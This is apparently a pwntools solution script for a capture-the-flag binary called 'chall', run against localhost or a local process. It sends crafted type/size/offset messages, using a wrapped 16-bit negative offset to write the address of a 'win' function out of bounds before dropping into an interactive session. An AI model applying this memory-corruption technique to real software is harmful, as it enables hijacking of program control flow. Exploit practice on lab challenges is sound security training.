from pwn import *

context.binary = elf = ELF("./chall")
if args.REMOTE:
    p = remote("localhost", 35124)
else:
    p = process("./chall")

payload  = p8(1) # type
payload += p16(20) # size
payload += p16(0) # offset
payload += b"A"*20

p.send(payload)

payload  = p8(2) # type
payload += p16(8) # size
payload += p16(0x10000-152) # offset
payload += p64(elf.sym.win)

p.send(payload)

payload  = p8(2) # type
payload += p16(1) # size
payload += p16(0x181) # offset
payload += b"B"

# gdb.attach(p)
p.send(payload)


p.interactive()
